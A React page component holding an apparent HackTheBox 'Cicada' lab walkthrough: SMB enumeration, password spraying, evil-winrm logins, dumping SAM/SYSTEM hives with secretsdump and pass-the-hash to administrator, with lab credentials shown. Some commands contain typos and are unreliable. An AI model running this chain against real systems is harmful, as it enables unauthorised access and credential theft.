import cicada_1 from '../../../assets/cicada_1.png';
import cicada_2 from '../../../assets/cicada_2.png';
import cicada_3 from '../../../assets/cicada_3.png';
import cicada_4 from '../../../assets/cicada_4.png';
import cicada_5 from '../../../assets/cicada_5.png';
import cicada_6 from '../../../assets/cicada_6.png';
import cicada_7 from '../../../assets/cicada_7.png';
import cicada_8 from '../../../assets/cicada_8.png';
import cicada_9 from '../../../assets/cicada_9.png';
import cicada_10 from '../../../assets/cicada_10.png';
import cicada_11 from '../../../assets/cicada_11.png';
import cicada_12 from '../../../assets/cicada_12.png';
import cicada_13 from '../../../assets/cicada_13.png';
import cicada_14 from '../../../assets/cicada_14.png';
import cicada_15 from '../../../assets/cicada_15.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';


const Cicada = () =>{
    return(
        <section>
            <h1>Cicada</h1>
            <ExampleFrame screen={cicada_1} />
            <div className='waring'>
                <p><span className='important'>crackmapexec smb 10.10.11.35 -d cicada.htb -u 'guest' -p '' --shares</span></p>
            </div>

            <ExampleFrame screen={cicada_2} />

            <div className='waring'>
                <p><span className='important'>smbclient -U guest \\\\10.10.11.35\\HR</span></p>
                <p><span className='important'>get "Notice from HR.txt</span></p>
            </div>

            <ExampleFrame screen={cicada_3} />
            <ExampleFrame screen={cicada_4} />
            
            <div className='waring'>
                <p><span className='important'>crackmapexec smb 10.10.11.35 -d cicada.htb -u 'guest' -p '' --rid-brute </span></p>
            </div>
            <ExampleFrame screen={cicada_5} />
            <div className='waring'>
                <p>users.txt</p>
                <br />
                <p>john.smoulder</p>
                <p>sarah.dantelia</p>
                <p>michael.wrightson</p>
                <p>david.orelious</p>
                <p>emily.oscars</p>
            </div>
            <div className='waring'>
                <p>password.txt</p>
                <br />
                <p>Cicada$M6Corpb*@Lp#nZp!8</p>
            </div>
            <div className='waring'>
                <p><span className='important'>crackmapexec smb 10.10.11.35 -d cicada.htb -u users.txt -p passwords.txt</span></p>
            </div>
            <ExampleFrame screen={cicada_6} />
            <div className='waring'>
                <p><span className='important'>enum4linix -a -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35</span></p>
            </div>
            <ExampleFrame screen={cicada_7} />
            <div className='waring'>
                <p><span className='important'>crackmapexec -d cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares</span></p>
                <p><span className='important'>smbclient -U david.orelious \\\\10.10.11.35\\DEV</span></p>
            </div>
            <ExampleFrame screen={cicada_8} />
            <ExampleFrame screen={cicada_9} />
            <div className='waring'>
                <p><span className='important'>evil-winrm -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*VT' -i 10.10.11.35</span></p>
            </div>
            <ExampleFrame screen={cicada_10} />

            <hr />
            <h2>Escalating Privileges</h2>
            <ExampleFrame screen={cicada_11} />
            <div className='waring'>
                <p><span className='important'>req save hklm/sam C:\Temp\sam</span></p>
                <p><span className='important'>req save hklm/system C:\Temp\system</span></p>
            </div>
            <ExampleFrame screen={cicada_12} />
            <div className='waring'>
                <p><span className='important'>download sam /home/kali/htb/Machnes/AD/Cicada/sam</span></p>
                <p><span className='important'>download sam /home/kali/htb/Machnes/AD/Cicada/system</span></p>
            </div>
            <ExampleFrame screen={cicada_13} />
            <div className='waring'>
                <p><span className='important'>impacket-secretsdump -sam sam -system system LOCAL</span></p>
            </div>
            <ExampleFrame screen={cicada_14} />
            <div className='waring'>
                <p><span className='important'>evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.10.11.35</span></p>
            </div>
            <ExampleFrame screen={cicada_15} />

        </section>
    )
}

export default Cicada;